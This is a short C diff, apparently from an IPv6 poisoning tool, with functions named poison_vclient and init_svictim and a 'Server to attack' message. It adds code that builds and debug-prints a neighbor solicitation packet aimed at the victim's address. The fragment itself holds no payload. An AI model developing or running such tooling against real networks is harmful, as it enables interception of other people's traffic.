@@ -13,6 +13,7 @@
 #include <netinet/tcp.h>
 #include <netinet/ether.h>
 
+#include <disturber.h>
 #include <packets.h>
 #include <device.h>
 
@@ -91,11 +92,16 @@ void *poison_vclient(void *conn) {
 
 void init_svictim(const char *sv_address) {
 	char server_victim[INET6_ADDRSTRLEN];
+	char *pkt;
 
 	if (inet_pton(AF_INET6, sv_address, &svictim.ipv6) <= 0) {
 		printf("Error setting victim's address\n");
 		exit(EXIT_FAILURE);
 	}
+
+	pkt = alloc_ndsolicit(&svictim.ipv6);
+	debug_packet(pkt);
+	free(pkt);
 
 	inet_ntop(AF_INET6, &svictim.ipv6, server_victim, INET6_ADDRSTRLEN);
 	printf("Server to attack: %s\n", server_victim);
